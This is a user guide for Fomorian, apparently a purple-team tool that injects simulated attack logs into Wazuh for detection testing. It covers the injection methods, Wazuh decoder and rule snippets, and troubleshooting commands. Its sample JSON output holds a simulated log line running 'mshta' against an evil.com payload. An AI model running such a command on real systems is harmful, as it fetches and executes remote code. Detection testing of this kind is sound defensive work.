# Fomorian SIEM Import Guide

This guide explains how to import Fomorian attack scenarios into Wazuh. Fomorian supports multiple injection methods for different Wazuh deployment types.

## Table of Contents

1. [Quick Start](#quick-start)
2. [Wazuh Injection Methods](#wazuh-injection-methods)
3. [Output Formats](#output-formats)
4. [Troubleshooting](#troubleshooting)

---

## Quick Start

```bash
# Detect your Wazuh installation
fomorian detect-wazuh --siem-password YOUR_INDEXER_ADMIN_PASSWORD

# Generate and inject via Wazuh Indexer (recommended)
fomorian generate \
  --config ./my-config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method indexer \
  --siem-password YOUR_INDEXER_ADMIN_PASSWORD

# Or inject existing scenario
fomorian inject ./scenario.json -s wazuh \
  --inject-method indexer \
  --password YOUR_INDEXER_ADMIN_PASSWORD

# Auto-detect best method (picks indexer when available)
fomorian inject ./scenario.json -s wazuh --inject-method auto \
  --password YOUR_INDEXER_ADMIN_PASSWORD
```

---

## Wazuh Injection Methods

Fomorian supports multiple injection methods depending on your Wazuh deployment:

| Method | Best For | Requirements |
|--------|----------|--------------|
| `indexer` | **Any Wazuh with Indexer (recommended)** | Indexer admin password |
| `alerts` | Docker Wazuh + Filebeat | Write access to alerts.json |
| `archives` | Local Wazuh with archives enabled | Write access to archives.json |
| `file` | Agent only deployments | ossec.conf localfile setup |
| `api` | Remote Wazuh Manager | API credentials |
| `auto` | Any deployment | Auto-detects best method |

### Method 1: Wazuh Indexer (Recommended)

Uses the OpenSearch Bulk API to inject logs directly into the Wazuh Indexer. This is the most reliable method for bulk injection, with consistent 95%+ success rates. It avoids the Filebeat race condition that causes `alerts.json` bulk appends to lose ~90% of injected logs.

**Requirements:**
- Wazuh Indexer running (default: `https://localhost:9200`)
- Admin password (set during Wazuh installation)

```bash
# Using environment variable for password
export PURPLE_TEAM_PASSWORD=YOUR_INDEXER_ADMIN_PASSWORD

fomorian inject ./scenario.json -s wazuh --inject-method indexer

# Or pass password directly
fomorian inject ./scenario.json -s wazuh \
  --inject-method indexer \
  --password YOUR_INDEXER_ADMIN_PASSWORD

# Custom indexer host/port
fomorian inject ./scenario.json -s wazuh \
  --inject-method indexer \
  --password YOUR_PASSWORD \
  --indexer-host 192.168.1.100 \
  --indexer-port 9200
```

**How it works:**
1. Builds NDJSON bulk payload with `{"index":{"_index":"wazuh-alerts-4.x-YYYY.MM.DD"}}` action lines
2. POSTs to `/_bulk` endpoint with Basic auth (`admin:{password}`)
3. Handles partial failures and reports per-document success/failure counts
4. Uses HTTPS with self-signed certificate support (standard Wazuh setup)

**Environment variables:**
```bash
export WAZUH_INDEXER_HOST=localhost     # Default: localhost
export WAZUH_INDEXER_PORT=9200         # Default: 9200
export PURPLE_TEAM_PASSWORD=password   # Indexer admin password
```

### Method 2: Alerts Injection

Writes logs directly to `/var/ossec/logs/alerts/alerts.json`. Works when Filebeat forwards alerts to your SIEM (Graylog, OpenSearch, Splunk, etc.).

**Best for Docker deployments** where `docker exec` provides reliable file writes. For native installs with bulk injection, prefer the indexer method since Filebeat can miss logs appended in bulk.

```bash
fomorian generate \
  --config ./config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method alerts
```

### Method 3: Archives Injection

Writes to `/var/ossec/logs/archives/archives.json`. Requires archives to be enabled in ossec.conf.

```bash
fomorian generate \
  --config ./config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method archives
```

### Method 4: File Based Injection

Write logs to a monitored file. Most compatible with agent-only deployments.

1. **Create log directory** on Wazuh manager:
   ```bash
   mkdir -p /var/log/purple-team
   chown wazuh:wazuh /var/log/purple-team
   ```

2. **Add to `/var/ossec/etc/ossec.conf`**:
   ```xml
   <localfile>
     <log_format>json</log_format>
     <location>/var/log/purple-team/attacks.json</location>
     <label key="purple_team">true</label>
   </localfile>
   ```

3. **Restart Wazuh manager**:
   ```bash
   systemctl restart wazuh-manager
   ```

4. **Generate and inject**:
   ```bash
   fomorian generate \
     --config ./config \
     --engagement ransomware \
     --inject wazuh \
     --inject-method file
   ```

### Method 5: Wazuh API Injection

For remote injection via the Wazuh Manager API.

```bash
fomorian generate \
  --config ./config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method api \
  --siem-host wazuh-manager.example.com \
  --siem-port 55000 \
  --siem-user wazuh-wui \
  --siem-password YOUR_PASSWORD
```

### Custom Decoder

Optionally create `/var/ossec/etc/decoders/purple-team-decoder.xml`:

```xml
<decoder name="fomorian">
  <prematch>^{"_purple_team":</prematch>
  <plugin_decoder>JSON_Decoder</plugin_decoder>
</decoder>
```

### Custom Detection Rules

Optionally create `/var/ossec/etc/rules/purple-team-rules.xml`:

```xml
<group name="purple_team,attack_simulation">
  <rule id="100100" level="10">
    <decoded_as>fomorian</decoded_as>
    <description>Purple Team: $(attack_phase) - $(technique)</description>
    <mitre>
      <id>$(technique)</id>
    </mitre>
  </rule>
</group>
```

---

## Output Formats

### JSON (Default)

```bash
fomorian generate -c ./config -e ransomware -f json -o ./scenario.json
```

Structure:
```json
{
  "_metadata": {
    "scenario_name": "Ransomware - Corp",
    "engagement_type": "ransomware",
    "total_logs": 19,
    "techniques_used": ["T1566.001", "T1059.001", "T1486"]
  },
  "logs": [
    {
      "sequence": 1,
      "timestamp": "2026-01-29T09:15:23.456Z",
      "attack_phase": "initial-access",
      "technique": "T1566.001",
      "host": "WS01",
      "log": {
        "winlog": {
          "event_id": 1,
          "event_data": {
            "CommandLine": "cmd.exe /c mshta http://evil.com/payload.hta"
          }
        }
      }
    }
  ]
}
```

### NDJSON (Streaming)

```bash
fomorian generate -c ./config -e ransomware -f ndjson -o ./scenario.ndjson
```

Each line is a complete JSON log, ideal for file monitoring.

### Split by Phase

```bash
fomorian generate -c ./config -e ransomware -f split -o ./scenario-dir
```

Creates separate files per attack phase.

---

## Troubleshooting

### Detecting Your Installation

```bash
fomorian detect-wazuh --show-instructions
```

This will detect:
- Docker vs native installation
- Manager vs agent only
- Available injection methods

### Connection Issues

```bash
# Test Wazuh Indexer connectivity
curl -sk -u admin:YOUR_PASSWORD https://localhost:9200/

# Check Wazuh Indexer alert indices
curl -sk -u admin:YOUR_PASSWORD 'https://localhost:9200/_cat/indices?index=wazuh-alerts-*&v'

# Test Wazuh API
curl -k -X GET "https://wazuh-manager:55000/security/user/authenticate" \
  -H "Authorization: Basic $(echo -n 'wazuh-wui:password' | base64)"

# Check if alerts.json is writable (Docker)
docker exec wazuh-manager ls -la /var/ossec/logs/alerts/

# Check if Filebeat is forwarding
docker logs filebeat 2>&1 | tail -20
```

### Detection Fails Without Root

If `fomorian detect-wazuh` can't find your Wazuh installation, the most common reason is `/var/ossec` having `750 wazuh:wazuh` permissions. Fomorian uses multiple detection signals that work without root:

1. Direct path check (with `PermissionError` handling)
2. `systemctl is-active wazuh-manager`
3. `dpkg -s wazuh-manager` / `rpm -q wazuh-manager`
4. `/etc/ossec-init.conf` existence

If all signals fail, you can pass the installation details explicitly:

```bash
fomorian inject ./scenario.json -s wazuh \
  --inject-method indexer \
  --password YOUR_PASSWORD \
  --indexer-host localhost \
  --indexer-port 9200
```

### Logs Not Appearing in SIEM

**If using the `alerts` method and most logs are missing:** Filebeat can miss logs that are bulk-appended to `alerts.json`. This is a known race condition where Filebeat's file offset tracker doesn't pick up all lines written in a single append. Switch to the `indexer` method for reliable bulk injection.

1. **Check Filebeat configuration** - Ensure `alerts.json` is being monitored:
   ```yaml
   # In filebeat.yml
   filebeat.inputs:
     - type: log
       paths:
         - /var/ossec/logs/alerts/alerts.json
   ```

2. **Check if logs are written**:
   ```bash
   docker exec wazuh-manager tail -5 /var/ossec/logs/alerts/alerts.json
   ```

3. **Check decoder field** - Fomorian logs should have `decoder.name: fomorian`

4. **Verify logs in indexer** (if using indexer method):
   ```bash
   curl -sk -u admin:YOUR_PASSWORD \
     'https://localhost:9200/wazuh-alerts-*/_count' \
     -H 'Content-Type: application/json' \
     -d '{"query":{"term":{"_fomorian_test":true}}}'
   ```

### Sigma Rules Not Firing

1. **Verify field names** - Check if `filebeat_data_win_eventdata_*` fields exist in your SIEM
2. **Check pipeline order** - Normalization must run before Sigma rules
3. **Check Sigma rule syntax** - Some rules have broken logic. See [sigma-rule-fixes/](sigma-rule-fixes/)

### Environment Variables

```bash
# Add to ~/.bashrc or ~/.zshrc

# Wazuh Indexer (for indexer injection method)
export WAZUH_INDEXER_HOST=localhost          # Default: localhost
export WAZUH_INDEXER_PORT=9200              # Default: 9200
export PURPLE_TEAM_PASSWORD=your-password   # Indexer admin password

# Wazuh Manager API (for api injection method)
export PURPLE_TEAM_HOST=wazuh-manager.local
export PURPLE_TEAM_PORT=55000
export PURPLE_TEAM_USERNAME=wazuh-wui
```

---

## Support

- GitHub: https://github.com/pookasecteam/fomorian-community/issues
- [Wazuh Documentation](https://documentation.wazuh.com/)
